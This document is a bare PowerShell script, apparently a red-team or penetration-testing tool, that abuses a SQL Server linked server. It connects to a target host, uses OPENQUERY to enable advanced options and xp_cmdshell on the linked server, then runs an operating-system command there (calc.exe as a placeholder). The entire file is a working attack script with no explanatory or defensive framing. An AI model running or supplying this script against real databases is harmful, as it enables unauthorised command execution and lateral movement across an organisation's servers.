$Target = "tar.dom.local"
$Link = "SQL01"
$Command = "calc.exe"

$sqlConnection = New-Object System.Data.SqlClient.SqlConnection
$sqlConnection.ConnectionString = "Server=$Target;Database=master;Integrated Security=True"
$sqlConnection.Open()
$sqlCmd = New-Object System.Data.SqlClient.SqlCommand
$sqlCmd.Connection = $sqlConnection

$sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1; EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'')' -f $Link
$reader = $sqlCmd.ExecuteReader()
$reader.Close()

$sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'')' -f $Link
$reader = $sqlCmd.ExecuteReader()
$reader.Close()

$sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC xp_cmdshell ''''{1}'''';'')' -f $Link,$Command
$reader = $sqlCmd.ExecuteReader()
while ($reader.Read()){
                $reader[0]
     }
$reader.Close()
$sqlConnection.Close()
